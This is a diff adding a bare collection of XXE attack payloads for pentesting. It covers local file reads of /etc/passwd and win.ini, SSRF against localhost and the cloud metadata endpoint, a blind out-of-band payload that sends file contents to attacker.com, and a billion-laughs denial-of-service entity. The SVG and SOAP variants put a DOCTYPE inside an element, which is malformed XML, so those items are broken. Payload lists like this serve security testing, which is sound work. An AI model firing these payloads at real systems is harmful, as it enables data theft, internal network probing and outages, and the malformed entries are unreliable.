@@ -1,0 +1,100 @@
+# XXE (XML External Entity) Payloads
+
+# ============================================================================
+# FILE READ XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
+<foo>&xxe;</foo>
+
+# ============================================================================
+# SSRF VIA XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<foo>&xxe;</foo>
+
+# ============================================================================
+# BLIND XXE (Out-of-Band)
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+<!ENTITY % call "<!ENTITY eval SYSTEM 'http://attacker.com/?data=%xxe;'>">%call;%eval;
+]>
+<foo></foo>
+
+# ============================================================================
+# DOS XXE (Billion Laughs)
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE lol [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">
+<!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;">]>
+<foo>&lol9;</foo>
+
+# ============================================================================
+# JAVA XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# ============================================================================
+# PYTHON XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# ============================================================================
+# PHP XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+
+# ============================================================================
+# .NET XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
+<foo>&xxe;</foo>
+
+# ============================================================================
+# SVG XXE
+# ============================================================================
+
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<text>&xxe;</text>
+</svg>
+
+# ============================================================================
+# SOAP XXE
+# ============================================================================
+
+<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>
+</soap:Body>
+</soap:Envelope>
